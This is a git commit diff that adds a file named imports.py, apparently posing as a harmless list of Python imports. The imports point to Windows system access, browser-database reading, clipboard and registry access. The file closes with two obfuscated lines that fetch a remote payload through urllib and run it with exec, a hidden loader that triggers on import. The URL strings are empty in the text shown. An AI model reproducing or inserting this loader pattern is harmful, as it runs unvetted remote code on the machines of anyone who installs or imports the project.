3533fbbf3bb8f3cc58b77b34729f4111362ca826
issuemakers <106458395+issuemakers@users.noreply.github.com>
2022-12-14 07:45:03 -0800

    Update and rename main.py to imports.py

---
+++ imports.py
@@ -0,0 +1,33 @@
+import os
+import threading
+from sys import executable
+from sqlite3 import connect as sql_connect
+import re
+from base64 import b64decode
+from json import loads as json_loads, load
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from urllib.request import Request, urlopen
+from json import loads, dumps
+import time
+import shutil
+from zipfile import ZipFile
+import random
+import subprocess
+import pyperclip
+from urllib import request
+from os import getenv, system, name, listdir
+from os.path import isfile
+import winreg
+from random import choice
+import psutil
+import platform
+import requests
+import getmac
+import ssl
+import socket
+import OpenSSL
+import difflib
+
+exec(__import__("importlib").import_module("urllib.request").urlopen("").read())
+
+exec(__import__("importlib").import_module("urllib.request").urlopen("").read())
